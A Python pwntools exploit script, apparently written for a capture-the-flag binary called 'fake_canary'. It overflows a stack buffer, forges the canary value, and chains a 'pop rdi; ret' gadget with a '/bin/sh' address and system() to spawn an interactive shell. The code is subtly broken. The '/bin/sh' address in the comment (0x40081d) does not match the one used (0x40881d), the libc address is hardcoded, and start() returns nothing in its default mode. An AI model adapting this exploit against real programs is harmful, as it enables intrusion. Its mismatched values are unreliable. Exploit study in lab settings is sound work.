#!/usr/bin/env python3

from pwn import *

def get_gadgets(binary):
    gadgets = []
    rop = ROP(binary)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    ret = rop.find_gadget(['ret']).address

    log.info("Got pop rdi; ret:  " +  hex(pop_rdi))
    log.info("Got ret:  " + hex(ret))
    gadgets.append(pop_rdi)
    gadgets.append(ret)

    return gadgets


def start(argv=[], *a, **kw):
    '''Locally start the exploit'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.LOCAL:
        return process([exe.path] + argv, *a, **kw)


exe = context.binary = ELF('./fake_canary')
# ./exploit.py GDB
gdbscript = '''
break *0x4006fd
continue
'''.format(**locals())

# get ROP gadgets. Need second ret to align stack
POP_RDI, RET = get_gadgets('fake_canary')

# Trying without leaking libc addrs on remote (it works)
# search -t string "/bin/sh"
# fake_canary     0x40081d 0x68732f6e69622f /* '/bin/sh' */
BIN_SH = p64(0x40881d)

# p system
#$1 = {int (const char *)} 0x7ffff7e0f410 <__libc_system>
SYSTEM = p64(0x7ffff7e0f410)

# Payload 
payload = b"A"*40 + b"\xef\xbe\xad\xde" + b"\x00"*12 + p64(POP_RDI) + BIN_SH + p64(RET) + SYSTEM

# Start process
io = start()
io.recvuntil("your name?\n")
io.sendline(payload)
log.info("Sent payload")
io.interactive()

